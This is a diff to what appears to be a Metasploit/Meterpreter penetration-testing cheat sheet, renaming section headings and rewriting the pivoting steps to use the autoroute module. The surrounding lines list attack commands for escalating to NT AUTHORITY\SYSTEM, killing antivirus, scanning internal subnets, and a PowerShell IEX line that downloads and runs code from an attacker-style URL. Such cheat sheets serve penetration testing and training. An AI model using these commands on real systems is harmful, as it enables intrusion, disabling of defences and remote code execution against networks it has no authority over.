@@ -189,7 +189,7 @@ ipconfig                                      Show the target IP
 route                                         Look for an additional subnet
 ------------------------------------------------------------------------------------------------------
 
-# Escalate privileges - Windows
+# Privilege escalation
 
 use priv                                      Attempt to elevate to NT AUTHORITY\SYSTEM
 background                                    If this fails, background the current session and try options
@@ -378,7 +378,7 @@ set RHOST <target IP>
 exploit
 ------------------------------------------------------------------------------------------------------
 
-# Windows enumeration
+# Enumeration
 
 run killav
 run getcountermeasure
@@ -414,16 +414,8 @@ powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://hacke
 
 # Pivoting
 
-run get_local_subnets                         Get the local subnets
-ipconfig                                      Look for dual-homed connections
-                                              192.168.0.10
-                                              10.0.0.5
-
+run post/multi/manage/autoroute               Add routes to all local subnets
 run arp_scanner -r 10.10.0.1/24
-
-meterpreter > background
-route add 10.0.0.1/24 x                       Where x is the meterpreter session ID
-route print                                   Verify the new route
 
 use auxiliary/scanner/portscan/tcp
 set RHOSTS 10.0.0.0/24
